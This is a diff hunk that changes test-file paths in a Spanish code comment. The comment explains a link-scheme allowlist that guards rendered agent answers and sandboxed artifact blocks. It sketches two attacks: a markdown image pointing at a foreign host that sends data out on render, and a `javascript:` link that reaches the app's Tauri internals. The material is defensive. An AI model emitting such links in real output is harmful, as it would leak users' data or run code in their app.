@@ -4,12 +4,12 @@
  *
  * Sin este filtro, `![](http://ajeno/?d=…)` dispara el GET al pintarse, sin un
  * clic, y un `[x](javascript:…)` ejecuta al pulsarlo y alcanza
- * `window.__TAURI_INTERNALS__` (medido en `attacks/window.mjs`).
+ * `window.__TAURI_INTERNALS__` (medido en `tests/security/window.mjs`).
  *
  * Lo usan los dos lados de la misma frontera: `ui/Markdown.tsx` (respuesta del
  * agente) y `lib/sandbox.ts` (bloques del marco de artefactos). Dos copias
  * divergen, y la que se quede atrás es la que se ataca. Sin dependencias:
- * `scripts/links.test.ts` lo importa desde Node a secas.
+ * `tests/unit/links.test.ts` lo importa desde Node a secas.
  *
  * Las dos son listas de lo que pasa, no de lo que se rechaza: el navegador
  * borra tabuladores y saltos de línea antes de resolver el esquema, así que
